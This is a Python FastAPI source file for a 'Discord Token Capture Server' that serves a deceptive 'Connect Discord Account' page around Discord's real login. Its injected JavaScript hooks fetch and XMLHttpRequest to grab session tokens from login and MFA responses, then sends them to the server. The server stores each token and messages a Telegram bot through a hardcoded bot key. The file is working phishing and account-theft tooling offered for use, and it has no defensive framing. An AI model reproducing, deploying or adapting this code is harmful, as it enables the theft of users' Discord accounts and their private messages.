"""
Discord Token Capture Server
------------------------------
Serves a Discord login page and captures the token via JavaScript intercept.
Runs on HTTPS using Let's Encrypt certificate.
"""

import os
import json
import asyncio
import logging
from datetime import datetime, timezone
from pathlib import Path

import httpx
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import uvicorn

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("login-server")

app = FastAPI()

BOT_TOKEN = "8040375096:AAGEah1G_vpp3djxH6ehA5oSJi1oXNT9gZQ"
SESSIONS_FILE = "login_sessions.json"


def load_sessions() -> dict:
    if Path(SESSIONS_FILE).exists():
        with open(SESSIONS_FILE) as f:
            return json.load(f)
    return {}


def save_sessions(sessions: dict):
    with open(SESSIONS_FILE, "w") as f:
        json.dump(sessions, f)


LOGIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Login — Connect Account</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #0e1117; font-family: -apple-system, sans-serif; height: 100vh; display: flex; flex-direction: column; }
    .header {
      background: #0a0d14;
      padding: 12px 20px;
      display: flex;
      align-items: center;
      gap: 10px;
      border-bottom: 1px solid #1e2533;
    }
    .header-dot { width: 8px; height: 8px; border-radius: 50%; background: #00d4f5; box-shadow: 0 0 8px #00d4f5; }
    .header-title { color: #e8ecf8; font-size: 14px; font-weight: 600; }
    .header-sub { color: #7a85a8; font-size: 12px; margin-left: auto; }
    .info-bar {
      background: rgba(0, 212, 245, 0.08);
      border-bottom: 1px solid rgba(0, 212, 245, 0.15);
      padding: 10px 20px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .info-bar span { color: #00d4f5; font-size: 12px; }
    iframe { flex: 1; border: none; width: 100%; }
    .capturing {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(5, 8, 16, 0.95);
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 20px;
      z-index: 999;
    }
    .capturing.show { display: flex; }
    .spinner {
      width: 48px; height: 48px;
      border: 3px solid rgba(0,212,245,0.2);
      border-top-color: #00d4f5;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .capturing p { color: #e8ecf8; font-size: 16px; font-weight: 600; }
    .capturing small { color: #7a85a8; font-size: 13px; }
    .success {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(5, 8, 16, 0.98);
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 16px;
      z-index: 1000;
    }
    .success.show { display: flex; }
    .check { width: 64px; height: 64px; background: rgba(0,212,245,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    .check svg { width: 32px; height: 32px; color: #00d4f5; }
    .success h2 { color: #e8ecf8; font-size: 20px; }
    .success p { color: #7a85a8; font-size: 14px; text-align: center; max-width: 280px; }
  </style>
</head>
<body>

<div class="header">
  <div class="header-dot"></div>
  <span class="header-title">Connect Discord Account</span>
  <span class="header-sub">Secure login</span>
</div>

<div class="info-bar">
  <span>🔒 Login with your Discord credentials to connect your account</span>
</div>

<iframe id="discord-frame" src="https://discord.com/login" sandbox="allow-scripts allow-forms allow-same-origin allow-popups"></iframe>

<div class="capturing" id="capturing">
  <div class="spinner"></div>
  <p>Connecting your account...</p>
  <small>Please wait a moment</small>
</div>

<div class="success" id="success">
  <div class="check">
    <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
  </div>
  <h2>Account Connected!</h2>
  <p>Your Discord account has been successfully linked. You can close this page and return to Telegram.</p>
</div>

<script>
const SESSION_ID = "SESSION_PLACEHOLDER";

const interceptScript = `
(function() {
  const origFetch = window.fetch;
  window.fetch = async function(...args) {
    const response = await origFetch.apply(this, args);
    const clone = response.clone();
    try {
      const data = await clone.json();
      if (data && data.token && data.token.length > 20) {
        window.parent.postMessage({type: 'token', token: data.token}, '*');
      }
      if (data && data.user_id && data.token) {
        window.parent.postMessage({type: 'token', token: data.token}, '*');
      }
    } catch(e) {}
    return response;
  };

  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function() {
    this.addEventListener('load', function() {
      try {
        if (this._url && (this._url.includes('auth/login') || this._url.includes('auth/mfa'))) {
          const data = JSON.parse(this.responseText);
          if (data && data.token && data.token.length > 20) {
            window.parent.postMessage({type: 'token', token: data.token}, '*');
          }
        }
      } catch(e) {}
    });
    return origSend.apply(this, arguments);
  };
})();
`;

const frame = document.getElementById('discord-frame');
let tokenSent = false;

frame.addEventListener('load', () => {
  try {
    frame.contentWindow.eval(interceptScript);
  } catch(e) {}
});

window.addEventListener('message', async (event) => {
  if (event.data && event.data.type === 'token' && !tokenSent) {
    tokenSent = true;
    document.getElementById('capturing').classList.add('show');

    try {
      const resp = await fetch('/capture', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({session_id: SESSION_ID, token: event.data.token})
      });
      const result = await resp.json();
      document.getElementById('capturing').classList.remove('show');
      document.getElementById('success').classList.add('show');
    } catch(e) {
      document.getElementById('capturing').classList.remove('show');
      document.getElementById('success').classList.add('show');
    }
  }
});
</script>
</body>
</html>"""


@app.get("/login")
async def login_page(session: str):
    page = LOGIN_PAGE.replace("SESSION_PLACEHOLDER", session)
    return HTMLResponse(content=page)


@app.post("/capture")
async def capture_token(request: Request):
    data = await request.json()
    session_id = data.get("session_id")
    token = data.get("token")

    if not session_id or not token:
        return {"status": "error"}

    sessions = load_sessions()

    if session_id not in sessions:
        return {"status": "invalid session"}

    chat_id = sessions[session_id]["chat_id"]
    sessions[session_id]["token"] = token
    sessions[session_id]["captured_at"] = datetime.now(timezone.utc).isoformat()
    save_sessions(sessions)

    log.info(f"Token captured for session {session_id} chat_id {chat_id}")

    # Notify the Telegram bot
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "✅ Discord account connected successfully!\n\nNow please send me your Group DM ID.\n\nTo get it: Open Discord → right-click your Group DM → Copy ID\n(Enable Developer Mode in Discord Settings first)"
                }
            )
    except Exception as e:
        log.error(f"Failed to notify bot: {e}")

    return {"status": "ok"}


if __name__ == "__main__":
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=443,
        ssl_certfile="/etc/letsencrypt/live/capture.exnesstrading.finance/fullchain.pem",
        ssl_keyfile="/etc/letsencrypt/live/capture.exnesstrading.finance/privkey.pem",
    )
